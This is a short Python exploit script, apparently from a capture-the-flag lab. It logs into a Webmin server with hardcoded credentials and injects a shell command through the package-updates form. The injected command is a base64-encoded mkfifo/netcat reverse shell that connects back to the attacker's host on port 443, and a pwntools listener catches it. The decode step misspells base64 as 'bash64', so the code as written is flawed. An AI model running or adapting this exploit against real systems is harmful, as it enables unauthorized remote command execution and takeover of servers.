#!/usr/bin/python3

from pwn import *

import pdb
import urllib3
import requests

def def_handler(sig, frame):
    print("\n [!] Saliendo... \n")
    sys.exit(1)

# Cntrl + C
signal.signal(signal.SIGINT, def_handler)

# global variables
login_url = "https://10.10.10.160:10000/session_login.cgi"
packages_updates_url = "https://10.10.10.160:10000/package-updates/update.cgi"
lport = 443
def makeRequest():

    urllib3.disable_warnings() # SSL
    s = requests.session()
    s.verify = False

    post_data = {
        'page': '',
        'user': 'Matt',
        'pass': 'computer2008'
    }

    headers = {
        'Cookie': 'testing=1'
    }

    r = s.post(login_url, data=post_data, headers=headers)

    post_data = [
        ('u', 'acl/apt'),
        ('u', ' | bash -c "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTYuMiA0NDMgPi90bXAvZgo= | bash64 -d | sh"'),
        ('ok_top', 'Update Selected Packages')
    ]

    headers = {
        'Referer': 'https://10.10.10.160:10000/'
    }

    r = s.post(packages_updates_url, data=post_data, headers=headers)

if __name__=='__main__':
    try: 
        threading.Thread(target=makeRequest,args=()).start()
    except Exception as e:
        log.error(str(e))
    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()